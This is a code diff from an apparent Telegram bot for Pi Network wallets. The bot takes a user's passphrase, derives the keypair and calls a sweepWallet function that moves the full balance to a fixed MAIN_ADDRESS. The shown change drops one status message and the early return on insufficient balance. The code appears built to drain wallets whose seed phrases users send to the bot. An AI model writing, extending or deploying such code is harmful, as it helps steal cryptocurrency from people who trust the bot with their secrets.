@@ -63,7 +63,6 @@ bot.on('message', async (msg) => {
 
             try {
                 const kp = getKeypairFromPassphrase(passphrase)
-                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);
                 bot.sendMessage(chatId, `✅ Sender: ${kp.publicKey()}`);
                 bot.sendMessage(chatId, `✅ Receiver: GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS`);
 
@@ -72,7 +71,7 @@ bot.on('message', async (msg) => {
                 const balance = parseFloat(balanceString) - 0.98;
 
                 if(balance - 0.01 <= 0) {
-                    return bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
+                    bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
                 } else {
                     const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                     if(result.data && result.data.hash) {
